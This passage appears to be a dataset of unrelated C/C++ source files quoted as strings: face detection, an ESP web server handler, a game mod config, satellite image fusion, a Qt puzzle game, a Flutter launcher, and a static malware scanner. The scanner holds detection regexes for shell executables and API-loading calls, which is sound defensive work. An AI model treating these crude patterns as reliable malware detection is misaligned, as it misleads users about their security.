    "\ufeff#include \"CFace.h\"\n\n#include <opencv2/dnn.hpp>\n\nCFace::CFace()\n{\n\n}\n\n\nvoid CFace::detectFace()\n{\n\n\t// \u6253\u5f00\u6444\u50cf\u5934\n\tcv::VideoCapture cap(0);\n\tif (!cap.isOpened())\n\t{\n\t\tstd::cerr << \"Error: Cannot open the camera.\" << std::endl;\n\t\treturn;\n\t}\n\n\n\t// \u52a0\u8f7d SSD \u6a21\u578b\n\tcv::dnn::Net net = cv::dnn::readNetFromCaffe(\"deploy.prototxt\", \"res10_300x300_ssd_iter_140000.caffemodel\");\n\n\n\t// \u542f\u7528 OpenCL \u52a0\u901f\n\tnet.setPreferableBackend(cv::dnn::DNN_BACKEND_DEFAULT);\n\tnet.setPreferableTarget(cv::dnn::DNN_TARGET_OPENCL);\n\n\n\tcv::Mat frame;\n\twhile (true)\n\t{\n\t\tcap >> frame;\n\t\tif (frame.empty())\n\t\t{\n\t\t\tstd::cerr << \"Error: Cannot read frame from the camera.\" << std::endl;\n\t\t\tbreak;\n\t\t}\n\n\n\t\t// \u5c06\u5e27\u8f6c\u6362\u4e3a\u7f51\u7edc\u8f93\u5165\u7684 blob \u683c\u5f0f\n\t\tcv::Mat blob = cv::dnn::blobFromImage(frame, 1.0, cv::Size(300, 300), cv::Scalar(104.0, 177.0, 123.0), false, false);\n\n\n\t\t// \u5c06 blob \u4f5c\u4e3a\u8f93\u5165\u8bbe\u7f6e\u5230\u7f51\u7edc\u4e2d\n\t\tnet.setInput(blob);\n\n\n\t\t// \u8fdb\u884c\u524d\u5411\u4f20\u64ad\uff0c\u5f97\u5230\u68c0\u6d4b\u7ed3\u679c\n\t\tcv::Mat detections = net.forward();\n\n\n\t\t// \u89e3\u6790\u68c0\u6d4b\u7ed3\u679c\n\t\tfor (int i = 0; i < detections.size[2]; ++i)\n\t\t{\n\t\t\tfloat confidence = detections.ptr<float>(0, 0)[i * 7 + 2];\n\n\n\t\t\t// \u53ea\u4fdd\u7559\u7f6e\u4fe1\u5ea6\u5927\u4e8e 0.5 \u7684\u4eba\u8138\u68c0\u6d4b\u7ed3\u679c\n\t\t\tif (confidence > 0.5)\n\t\t\t{\n\t\t\t\tint startX = static_cast<int>(detections.ptr<float>(0, 0)[i * 7 + 3] * frame.cols);\n\t\t\t\tint startY = static_cast<int>(detections.ptr<float>(0, 0)[i * 7 + 4] * frame.rows);\n\t\t\t\tint endX = static_cast<int>(detections.ptr<float>(0, 0)[i * 7 + 5] * frame.cols);\n\t\t\t\tint endY = static_cast<int>(detections.ptr<float>(0, 0)[i * 7 + 6] * frame.rows);\n\n\n\t\t\t\t// \u7ed8\u5236\u4eba\u8138\u68c0\u6d4b\u6846\n\t\t\t\tcv::rectangle(frame, cv::Point(startX, startY), cv::Point(endX, endY), cv::Scalar(255, 0, 0), 2);\n\t\t\t}\n\t\t}\n\n\n\t\t// \u663e\u793a\u7ed3\u679c\n\t\t//cv::imshow(\"Face Detection\", frame);\n\n\t\t// \u5c06 cv::Mat \u8f6c\u6362\u4e3a QImage\n\t\tQImage qImage = cvMatToQImage(frame);\n\t\t//label.setPixmap(QPixmap::fromImage(qImage));\n\t\t//label.show();\n\n\t\t// \u6309\u4e0b 'q' \u952e\u9000\u51fa\n\t\tif (cv::waitKey(1) == 'q')\n\t\t{\n\t\t\tbreak;\n\t\t}\n\t}\n\n\n\t// \u91ca\u653e\u6444\u50cf\u5934\u548c\u5173\u95ed\u7a97\u53e3\n\tcap.release();\n\tcv::destroyAllWindows();\n\n}\n\n// \u51fd\u6570\uff1a\u5c06 cv::Mat \u8f6c\u6362\u4e3a QImage\nQImage CFace::cvMatToQImage(const cv::Mat& inMat) {\n\tswitch (inMat.type())\n\t{\n\tcase CV_8UC4: {\n\t\tQImage image(inMat.data, inMat.cols, inMat.rows, inMat.step, QImage::Format_RGBA8888);\n\t\treturn image.copy();\n\t}\n\tcase CV_8UC3: {\n\t\tQImage image(inMat.data, inMat.cols, inMat.rows, inMat.step, QImage::Format_RGB888);\n\t\treturn image.rgbSwapped();\n\t}\n\tcase CV_8UC1: {\n\t\tstatic QVector<QRgb> sColorTable;\n\t\tif (sColorTable.isEmpty())\n\t\t{\n\t\t\tfor (int i = 0; i < 256; ++i)\n\t\t\t\tsColorTable.push_back(qRgb(i, i, i));\n\t\t}\n\t\tQImage image(inMat.data, inMat.cols, inMat.rows, inMat.step, QImage::Format_Indexed8);\n\t\timage.setColorTable(sColorTable);\n\t\treturn image;\n\t}\n\tdefault:\n\t\tstd::cerr << \"\u4e0d\u652f\u6301\u7684 cv::Mat \u7c7b\u578b\" << std::endl;\n\t\tbreak;\n\t}\n\treturn QImage();\n}\n\n",
    "/*\n  Asynchronous WebServer library for Espressif MCUs\n\n  Copyright (c) 2016 Hristo Gochkov. All rights reserved.\n  This file is part of the esp8266 core for Arduino environment.\n\n  This library is free software; you can redistribute it and/or\n  modify it under the terms of the GNU Lesser General Public\n  License as published by the Free Software Foundation; either\n  version 2.1 of the License, or (at your option) any later version.\n\n  This library is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n  Lesser General Public License for more details.\n\n  You should have received a copy of the GNU Lesser General Public\n  License along with this library; if not, write to the Free Software\n  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n*/\n#include \"ESPAsyncWebServer.h\"\n#include \"WebHandlerImpl.h\"\n\nAsyncStaticWebHandler::AsyncStaticWebHandler(const char* uri, FS& fs, const char* path, const char* cache_control)\n  : _fs(fs), _uri(uri), _path(path), _default_file(\"index.htm\"), _cache_control(cache_control), _last_modified(\"\"), _callback(nullptr)\n{\n  // Ensure leading '/'\n  if (_uri.length() == 0 || _uri[0] != '/') _uri = \"/\" + _uri;\n  if (_path.length() == 0 || _path[0] != '/') _path = \"/\" + _path;\n\n  // If path ends with '/' we assume a hint that this is a directory to improve performance.\n  // However - if it does not end with '/' we, can't assume a file, path can still be a directory.\n  _isDir = _path[_path.length()-1] == '/';\n\n  // Remove the trailing '/' so we can handle default file\n  // Notice that root will be \"\" not \"/\"\n  if (_uri[_uri.length()-1] == '/') _uri = _uri.substring(0, _uri.length()-1);\n  if (_path[_path.length()-1] == '/') _path = _path.substring(0, _path.length()-1);\n\n  // Reset stats\n  _gzipFirst = false;\n  _gzipStats = 0xF8;\n}\n\nAsyncStaticWebHandler& AsyncStaticWebHandler::setIsDir(bool isDir){\n  _isDir = isDir;\n  return *this;\n}\n\nAsyncStaticWebHandler& AsyncStaticWebHandler::setDefaultFile(const char* filename){\n  _default_file = String(filename);\n  return *this;\n}\n\nAsyncStaticWebHandler& AsyncStaticWebHandler::setCacheControl(const char* cache_control){\n  _cache_control = String(cache_control);\n  return *this;\n}\n\nAsyncStaticWebHandler& AsyncStaticWebHandler::setLastModified(const char* last_modified){\n  _last_modified = String(last_modified);\n  return *this;\n}\n\nAsyncStaticWebHandler& AsyncStaticWebHandler::setLastModified(struct tm* last_modified){\n  char result[30];\n  strftime (result,30,\"%a, %d %b %Y %H:%M:%S %Z\", last_modified);\n  return setLastModified((const char *)result);\n}\n\n#ifdef ESP8266\nAsyncStaticWebHandler& AsyncStaticWebHandler::setLastModified(time_t last_modified){\n  return setLastModified((struct tm *)gmtime(&last_modified));\n}\n\nAsyncStaticWebHandler& AsyncStaticWebHandler::setLastModified(){\n  time_t last_modified;\n  if(time(&last_modified) == 0) //time is not yet set\n    return *this;\n  return setLastModified(last_modified);\n}\n#endif\nbool AsyncStaticWebHandler::canHandle(AsyncWebServerRequest *request){\n  if(request->method() != HTTP_GET \n    || !request->url().startsWith(_uri) \n    || !request->isExpectedRequestedConnType(RCT_DEFAULT, RCT_HTTP)\n  ){\n    return false;\n  }\n  if (_getFile(request)) {\n    // We interested in \"If-Modified-Since\" header to check if file was modified\n    if (_last_modified.length())\n      request->addInterestingHeader(\"If-Modified-Since\");\n\n    if(_cache_control.length())\n      request->addInterestingHeader(\"If-None-Match\");\n\n    DEBUGF(\"[AsyncStaticWebHandler::canHandle] TRUE\\n\");\n    return true;\n  }\n\n  return false;\n}\n\nbool AsyncStaticWebHandler::_getFile(AsyncWebServerRequest *request)\n{\n  // Remove the found uri\n  String path = request->url().substring(_uri.length());\n\n  // We can skip the file check and look for default if request is to the root of a directory or that request path ends with '/'\n  bool canSkipFileCheck = (_isDir && path.length() == 0) || (path.length() && path[path.length()-1] == '/');\n\n  path = _path + path;\n\n  // Do we have a file or .gz file\n  if (!canSkipFileCheck && _fileExists(request, path))\n    return true;\n\n  // Can't handle if not default file\n  if (_default_file.length() == 0)\n    return false;\n\n  // Try to add default file, ensure there is a trailing '/' ot the path.\n  if (path.length() == 0 || path[path.length()-1] != '/')\n    path += \"/\";\n  path += _default_file;\n\n  return _fileExists(request, path);\n}\n\n#ifdef ESP32\n#define FILE_IS_REAL(f) (f == true && !f.isDirectory())\n#else\n#define FILE_IS_REAL(f) (f == true)\n#endif\n\nbool AsyncStaticWebHandler::_fileExists(AsyncWebServerRequest *request, const String& path)\n{\n  bool fileFound = false;\n  bool gzipFound = false;\n\n  String gzip = path + \".gz\";\n\n  if (_gzipFirst) {\n    request->_tempFile = _fs.open(gzip, \"r\");\n    gzipFound = FILE_IS_REAL(request->_tempFile);\n    if (!gzipFound){\n      request->_tempFi",
    "class CfgPatches\r\n{\r\n\tclass footballtangorosario\r\n\t{\r\n\t\trequiredVersion=0.1;\r\n\t\trequiredAddons[]=\r\n\t\t{\r\n\t\t\t\"DZ_Data\"\r\n\t\t};\r\n\t};\r\n};\r\n\r\nclass CfgMods\r\n{\r\n\tclass footballtangorosario\r\n\t{\r\n\t\tdir = \"CCBYAssets_Various\";\r\n\t\tpicture = \"\";\r\n\t\taction = \"\";\r\n\t\thideName = 1;\r\n\t\thidePicture = 1;\r\n\t\tname = \"Football Tango Rosario\";\r\n\t\tcredits = \"generalista3D\";\r\n\t\tauthor = \"Spaghettieis\";\r\n\t\tauthorID = \"\";\r\n\t\tversion = \"1.0\";\r\n\t\textra = 0;\r\n\t\ttype = \"mod\";\r\n\t\tdependencies[] = {\"World\"};\r\n\t\tclass defs\r\n\t\t{\r\n\t\t\tclass worldScriptModule\r\n\t\t\t{\r\n\t\t\t\tvalue = \"\";\r\n\t\t\t\tfiles[] = {\"CCBYAssets_Various\\Footballtangorosario\\scripts\\4_World\"};\r\n\t\t\t};\r\n\t\t};\r\n\t};\r\n};\r\n\r\nclass CfgVehicles\r\n{\r\n\tclass Bottle_Base;\r\n\tclass Inventory_Base;\r\n\tclass Box_Base;\r\n\tclass footballtangorosario: Inventory_Base\r\n\t{\r\n\t\tscope=2;\r\n\t\tdisplayName=\"Football Tango Rosario\";\r\n\t\tdescriptionShort=\"Leather ball with shiny waterproof coating, introduced as the official match ball of the 1978 Copa Mundial de F\u00fatbol, which the host nation Argentinia was to win in a tense 3-1 overtime final.\";\r\n\t\tmodel=\"CCBYAssets_Various\\Footballtangorosario\\data\\footballtangorosario.p3d\";\r\n\t\tweight=481;\r\n\t\tweightPerQuantityUnit=0;\r\n\t\titemSize[]={3,3};\r\n\t\tabsorbency=0.1;\r\n\t\trotationFlags=2;\r\n\t\tstackedUnit=\"w\";\r\n\t\tquantityBar=1;\r\n\t\trepairableWithKits[]={3};\r\n\t\trepairCosts[]={25};\r\n\t\tdebug_ItemCategory=6;\r\n\t\titemBehaviour[]={2};\r\n\t\tsoundImpactType=\"organic\";\r\n\t\tclass DamageSystem\r\n\t\t{\r\n\t\t\tclass GlobalHealth\r\n\t\t\t{\r\n\t\t\t\tclass Health\r\n\t\t\t\t{\r\n\t\t\t\t\thitpoints=100;\r\n\t\t\t\t\thealthLevels[]=\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t1,\r\n\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\"CCBYAssets_Various\\Footballtangorosario\\data\\footballtangorosario.rvmat\"\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t},\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t0.69999999,\r\n\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\"CCBYAssets_Various\\Footballtangorosario\\data\\footballtangorosario.rvmat\"\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t},\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t0.5,\r\n\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\"CCBYAssets_Various\\Footballtangorosario\\data\\footballtangorosario_damage.rvmat\"\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t},\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t0.30000001,\r\n\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\"CCBYAssets_Various\\Footballtangorosario\\data\\footballtangorosario_damage.rvmat\"\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t},\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t0,\r\n\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\"CCBYAssets_Various\\Footballtangorosario\\data\\footballtangorosario_destruct.rvmat\"\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t};\r\n\t\t\t\t};\r\n\t\t\t};\r\n\t\t};\r\n\t\tclass AnimEvents\r\n\t\t{\r\n\t\t\tclass SoundWeapon\r\n\t\t\t{\r\n\t\t\t\tclass drop\r\n\t\t\t\t{\r\n\t\t\t\t\tsoundset=\"bloodbag_drop_SoundSet\";\r\n\t\t\t\t\tid=898;\r\n\t\t\t\t};\r\n\r\n\t\t\t\tclass pickUpItem\r\n\t\t\t\t{\r\n\t\t\t\t\tsoundSet=\"Zucchini_pickup_SoundSet\";\r\n\t\t\t\t\tid=797;\r\n\t\t\t\t};\r\n\r\n\t\t\t};\r\n\t\t};\r\n\t};\r\n\t\r\n\t\r\n\t\r\n\t\r\n\t};\r\n\r\n",
    "#include \"starfm.h\"\n#include \"gdal_priv.h\"\n#include \"gdalwarper.h\"\n#include <iostream>\n#include <cmath>\n#include <ctime>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include <chrono>\n#include <cstring>\n#include <limits>\n#include <fstream>\n#include <sstream>\n\nvoid blending(float* L1, float* M1, float* M2, float* L2, int width, int height, int w, float A, float error_lm, float error_mm, int class_num)\n{\n    for (int row = 0; row < height; row++) {\n        for (int col = 0; col < width; col++) {\n            int idx = row * width + col;\n            float r_LM, r_MM, r_center_LM, r_center_MM;\n            float sum1 = 0, sum2 = 0;\n            int rmin, rmax, smin, smax;\n            float result = 0;\n            int judge = 0;\n            int kk = 0;\n            float wei = 0;\n\n            // \u68c0\u67e5\u6bcf\u4e2a\u50cf\u7d20\u503c\u662f\u5426\u6709\u6548\n            if (!is_valid(M2[idx]) || !is_valid(L1[idx]) || !is_valid(M1[idx])) {\n                continue;  // \u8df3\u8fc7\u65e0\u6548\u503c\n            }\n\n            r_center_LM = M2[idx] - L1[idx] + error_lm;\n            r_center_MM = M2[idx] - M1[idx] + error_mm;\n\n            // \u5b9a\u4e49\u7a97\u53e3\u5927\u5c0f\n            rmin = std::max(col - w / 2, 0);\n            rmax = std::min(col + w / 2, width - 1);\n            smin = std::max(row - w / 2, 0);\n            smax = std::min(row + w / 2, height - 1);\n\n            // \u5c40\u90e8\u7a97\u53e3\u5185\u8ba1\u7b97Landsat1\n            for (int i = smin; i <= smax; i++) {\n                for (int j = rmin; j <= rmax; j++) {\n                    if (is_valid(L1[i * width + j])) {\n                        sum1 += L1[i * width + j] * L1[i * width + j];\n                        sum2 += L1[i * width + j];\n                    }\n                }\n            }\n\n            // \u8ba1\u7b97\u6807\u51c6\u5dee\uff0c\u786e\u4fddsum1\u548csum2\u6709\u6548\n            if (sum1 == 0 || sum2 == 0) {\n                continue;  // \u907f\u514d\u8ba1\u7b97\u9519\u8bef\uff0c\u8df3\u8fc7\u6b64\u50cf\u7d20\n            }\n\n            float sigma = sqrt(sum1 / (w * w) - (sum2 / (w * w)) * (sum2 / (w * w)));  // \u6807\u51c6\u5dee\n            float st = sigma / class_num;\n\n            // \u5faa\u73af\u8ba1\u7b97\u90bb\u57df\u50cf\u7d20\u7684\u52a0\u6743\u7ed3\u679c\n            for (int i = smin; i <= smax; i++) {\n                for (int j = rmin; j <= rmax; j++) {\n                    if (is_valid(L1[i * width + j]) && fabs(L1[idx] - L1[i * width + j]) < st) {\n                        r_LM = M2[i * width + j] - L1[i * width + j];\n                        r_MM = M2[i * width + j] - M1[i * width + j];\n                        if ((r_center_LM > 0 && r_LM < r_center_LM) || (r_center_LM < 0 && r_LM > r_center_LM)) {\n                            if ((r_center_MM > 0 && r_MM < r_center_MM) || (r_center_MM < 0 && r_MM > r_center_MM)) {\n                                r_LM = fabs(r_LM) + 0.0001;\n                                r_MM = fabs(r_MM) + 0.0001;\n                                if (idx == i * width + j) {\n                                    judge = 1;\n                                }\n                                float dis = sqrt((row - i) * (row - i) + (col - j) * (col - j));\n                                dis = dis / A + 1.0;\n                                float weih = 1.0 / (dis * r_LM * r_MM);\n                                wei += weih;\n                                result += weih * (M1[i * width + j] + L1[i * width + j] - M2[i * width + j]);\n                                kk++;\n                            }\n                        }\n                    }\n                }\n            }\n\n            if (kk == 0) {\n                L2[idx] = fabs(L1[idx] + M1[idx] - M2[idx]);\n                wei = 10000;\n            }\n            else {\n                if (judge == 0) {\n                    float dis = 1.0;\n                    r_LM = fabs(M2[idx] - L1[idx]) + 0.0001;\n                    r_MM = fabs(M2[idx] - M1[idx]) + 0.0001;\n                    float weih = 1.0 / (dis * r_LM * r_MM);\n                    result += weih * (L1[idx] + M1[idx] - M2[idx]);\n                    wei += weih;\n                }\n                L2[idx] = result / wei;\n            }\n\n            //// \u8c03\u8bd5\uff1a\u8f93\u51fa\u7ed3\u679c\u503c\u7684\u8303\u56f4\u548c\u4e00\u4e9b\u50cf\u7d20\u503c\n            //if ((row * width + col) % (width * height / 10) == 0) {\n            //    std::cout << \"Debug: Pixel [\" << row << \", \" << col << \"] result: \" << L2[idx] << std::endl;\n            //    std::cout << \"    r_center_LM: \" << r_center_LM << \", r_center_MM: \" << r_center_MM << std::endl;\n            //    std::cout << \"    Sum1: \" << sum1 << \", Sum2: \" << sum2 << \", St: \" << st << std::endl;\n            //}\n        }\n    }\n}\n\nvoid runSTARFM_CPU(const std::string& landsatPath, const std::string& modisPath1, const std::string& modisPath2,\n    const std::string& outputPath, int win_size, float L_err, float M_err, int class_num, float A) {\n\n    GDALAllRegister();\n\n    // \u5f00\u59cb\u65f6\u95f4\n    auto start = std::chrono::high_resolution_clock::now();\n\n    GDALDataset* pLandsatDataset = (GDALDataset*)GDALOpen(landsatPath.c_str(), GA_ReadOnly);\n    GDALDataset* pModisDataset1 = (GDALDataset*)GDALOpen(modisPath1.c_str(), GA_ReadOnly);\n    GDALDataset* pModisDataset2 = (GDALDataset*)GDALOpen(modisPath2.c_str(), GA_ReadOnly);\n\n    if (!pLandsatDataset || !pModisDataset1 || !pM",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <iomanip>\n#include <openssl/md5.h>\n#include <openssl/sha.h>\n#include <sys/stat.h>\n#include <regex>\n#include <vector>\n#include <map>\n#include <windows.h> \n\nclass FileInfo {\npublic:\n    std::string filePath;\n    size_t fileSize;\n    std::string md5Hash;\n    std::string sha256Hash;\n    std::vector<std::string> suspiciousStrings;\n    std::string signatureMatch;\n    std::vector<std::string> suspiciousSections;\n    bool isPackedWithUPX = false;\n\n    FileInfo(const std::string& path) : filePath(path), fileSize(0) {}\n\n    bool exists() const {\n        struct stat buffer;\n        return (stat(filePath.c_str(), &buffer) == 0);\n    }\n\n    void calculateFileSize() {\n        struct stat buffer;\n        if (stat(filePath.c_str(), &buffer) == 0) {\n            fileSize = buffer.st_size;\n        }\n    }\n\n    void generateHashes() {\n        std::ifstream file(filePath, std::ios::binary);\n        if (!file) {\n            throw std::runtime_error(\"Failed to open file for hashing.\");\n        }\n\n        std::ostringstream oss;\n        oss << file.rdbuf();\n        std::string fileContent = oss.str();\n\n        // MD5\n        unsigned char md5Result[MD5_DIGEST_LENGTH];\n        MD5(reinterpret_cast<const unsigned char*>(fileContent.c_str()), fileContent.size(), md5Result);\n        md5Hash = hashToString(md5Result, MD5_DIGEST_LENGTH);\n\n        // SHA256\n        unsigned char sha256Result[SHA256_DIGEST_LENGTH];\n        SHA256(reinterpret_cast<const unsigned char*>(fileContent.c_str()), fileContent.size(), sha256Result);\n        sha256Hash = hashToString(sha256Result, SHA256_DIGEST_LENGTH);\n    }\n\n    void scanForSuspiciousStrings() {\n        std::ifstream file(filePath, std::ios::binary);\n        if (!file) {\n            throw std::runtime_error(\"Failed to open file for string analysis.\");\n        }\n\n        std::ostringstream oss;\n        oss << file.rdbuf();\n        std::string fileContent = oss.str();\n\n        std::vector<std::regex> patterns = {\n            std::regex(\"http[s]?://[\\\\w\\\\.-]+\"),\n            std::regex(\"cmd\\\\.exe\"),\n            std::regex(\"powershell\\\\.exe\"),\n            std::regex(\"LoadLibrary[A-Za-z]*\"),\n            std::regex(\"GetProcAddress\")\n        };\n\n        for (const auto& pattern : patterns) {\n            std::sregex_iterator begin(fileContent.begin(), fileContent.end(), pattern);\n            std::sregex_iterator end;\n\n            for (auto it = begin; it != end; ++it) {\n                suspiciousStrings.push_back(it->str());\n            }\n        }\n    }\n\n    void scanForSignatures(const std::string& signatureFile) {\n        std::ifstream sigFile(signatureFile);\n        if (!sigFile) {\n            throw std::runtime_error(\"Failed to open signature file.\");\n        }\n\n        std::map<std::string, std::string> signatures;\n        std::string line;\n        while (std::getline(sigFile, line)) {\n            size_t delimiter = line.find(':');\n            if (delimiter != std::string::npos) {\n                std::string hash = line.substr(0, delimiter);\n                std::string description = line.substr(delimiter + 1);\n                signatures[hash] = description;\n            }\n        }\n\n        auto it = signatures.find(md5Hash);\n        if (it != signatures.end()) {\n            signatureMatch = it->second;\n        } else {\n            signatureMatch = \"No match found.\";\n        }\n    }\n\n    void analyzePESections() {\n        std::ifstream file(filePath, std::ios::binary);\n        if (!file) {\n            throw std::runtime_error(\"Failed to open file for PE section analysis.\");\n        }\n\n        IMAGE_DOS_HEADER dosHeader;\n        file.read(reinterpret_cast<char*>(&dosHeader), sizeof(dosHeader));\n\n        if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {\n            suspiciousSections.push_back(\"Invalid DOS header.\");\n            return;\n        }\n\n        file.seekg(dosHeader.e_lfanew, std::ios::beg);\n        IMAGE_NT_HEADERS ntHeader;\n        file.read(reinterpret_cast<char*>(&ntHeader), sizeof(ntHeader));\n\n        if (ntHeader.Signature != IMAGE_NT_SIGNATURE) {\n            suspiciousSections.push_back(\"Invalid NT header.\");\n            return;\n        }\n\n        IMAGE_SECTION_HEADER sectionHeader;\n        for (int i = 0; i < ntHeader.FileHeader.NumberOfSections; ++i) {\n            file.read(reinterpret_cast<char*>(&sectionHeader), sizeof(sectionHeader));\n\n            std::string sectionName(reinterpret_cast<char*>(sectionHeader.Name), IMAGE_SIZEOF_SHORT_NAME);\n\n            if (sectionHeader.SizeOfRawData == 0) {\n                suspiciousSections.push_back(sectionName + \" (Empty section)\");\n            } else if (sectionHeader.SizeOfRawData > 1024 * 1024) {\n                suspiciousSections.push_back(sectionName + \" (Unusually large section)\");\n            }\n\n            if (sectionName.find(\"UPX\") != std::string::npos) {\n                isPackedWithUPX = true;\n                suspiciousSections.push_back(sectionName + \" (UPX-packed se",
    "/* The goal of this program is to create an gui to the binairo game. At the start of\n * the programm on the left is choise to input own gameboard of to set random seed.\n * Players can also change the ize of grid on the spinBox that also changes the size in\n * gameboard.hh/.cpp and changes so the number of same peices on one row/collums updates.\n * After the player has entered input/seed gameboard can be created if input is correct.\n * All of the object in the beginning of the game are placed in QTDesinger and are just\n * hidden/shown during the different parts of the game. Object are connected to each other\n * and depending on what player chooses, some are show some hidden\n * When game is started pushButtons are created to be used as the gameboard. The buttons\n * are placed onto a gridLayout. Pointer to each of the buttons are saved so they can be\n * later managed. Also click of each button is connected to a function that handels tile\n * placing. At the same time choise buttons are also created in th esame fashion.\n * When choise button/gametile is clicked, can the right button be identified b going\n * through the pointer. Checks if tile can be placed and places it if able.\n * Game end when no empty tiles remain, game is also timed usin QTimer.\n * Game can be reset or quit at any point using reset and quit buttons.\n *\n * Henri Laitinen\n *\n *\n * */\n\n\n\n\n#include \"mainwindow.hh\"\n#include \"ui_mainwindow.h\"\n#include \"gameboard.hh\"\n#include <string>\nusing namespace std;\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n\n    ui->setupUi(this);\n\n    ui->resetButton->setDisabled(true);\n\n    //Set up the pointers that indicate which tile is chousen\n    QPixmap image_pointer(\":/pointer.png\");\n    image_pointer=image_pointer.scaled(ui->whitePointer->size());\n    ui->blackPointer->setPixmap(image_pointer);\n    ui->whitePointer->setPixmap(image_pointer);   \n    ui->whitePointer->hide();\n    ui->blackPointer->hide();\n\n    //set up gridSize spinBox\n    ui->gridSize->setValue(3);\n\n\n\n\n\n    //hide random/input objects before choise\n    ui->minutesLabel->hide();\n    ui->secondsLabel->hide();\n    ui->youWonText->hide();\n    ui->randomLabel->hide();\n    ui->randomSeedSpinBox->hide();\n    ui->inputLabel->hide();\n    ui->inputTextEdit->hide();\n    ui->undoPushButton->hide();\n    ui->inputCreatePushButton->hide();\n    ui->randomCreatePushButton->hide();\n    ui->lcdSeconds->hide();\n    ui->lcdMinutes->hide();\n    ui->label_2->hide();\n    ui->label->hide();\n    ui->pointsLabel->hide();\n    ui->pointCounter->hide();\n\n\n\n\n    //set button colors\n    ui->randomCreatePushButton->setStyleSheet(\"background-color: #1adb5b\");\n    ui->inputCreatePushButton->setStyleSheet(\"background-color: #1adb5b\");\n    ui->closePushButton->setStyleSheet(\"background-color: red\");\n\n    //set up fonts\n    QFont errorFont;\n    errorFont.setPointSize(18);\n    ui->errorMessage->setFont(errorFont);\n    ui->errorMessage->setStyleSheet(\"color: red\");\n\n    QFont gameFont;\n    gameFont.setPointSize(16);\n    ui->gameError->setFont(gameFont);\n    ui->gameError->setStyleSheet(\"color: red\");\n\n    QFont pointFont;\n    pointFont.setPointSize(50);\n    ui->pointCounter->setFont(pointFont);\n    ui->pointCounter->setStyleSheet(\"color: green\");\n\n    //set random seed spinbox max and min\n    ui->randomSeedSpinBox->setMinimum(0);\n    ui->randomSeedSpinBox->setMaximum(50);\n\n\n    //Connects pushing the random input button to randomButtonClicked function\n    connect(ui->randomPushButton, &QPushButton::clicked, this, &MainWindow::randomButtonClicked);\n    //connects pushing the input button to a function inputButtonClicked\n    connect(ui->inputPushButton, &QPushButton::clicked, this, &MainWindow::inputButtonClicked);\n    //connects clicking the undo button to undoButtonClicked function\n    connect(ui->undoPushButton, &QPushButton::clicked, this, &MainWindow::undoButtonClicked);\n    //connects clicking the close button to closeButtonClicked function\n    connect(ui->closePushButton, &QPushButton::clicked, this, &MainWindow::closeButtonClicked);\n\n    //connects either of the create buttons being clicked to the createButtonClicked function\n    connect(ui->randomCreatePushButton, &QPushButton::clicked, this, &MainWindow::createButtonClicked);\n    connect(ui->inputCreatePushButton, &QPushButton::clicked, this, &MainWindow::createButtonClicked);\n\n    //Connects changing value of size SpinBox to sizeChanged function that changes the size of gameboard\n    connect(ui->gridSize, &QSpinBox::valueChanged, this, &MainWindow::sizeChanged);\n\n    //connects pressing reset button to resetButtonClicked\n    connect(ui->resetButton, &QPushButton::clicked, this, &MainWindow::resetButtonClicked);\n\n\n\n\n\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\n//a spinWheel appears to let player choose a seed (0-50), and a create button\n//to create a random gamboard using said seed\nvoid MainWindow::randomButtonClicked()\n{\n    randomInputCondition=true;\n    ui->randomPushB",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app_pfaa\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
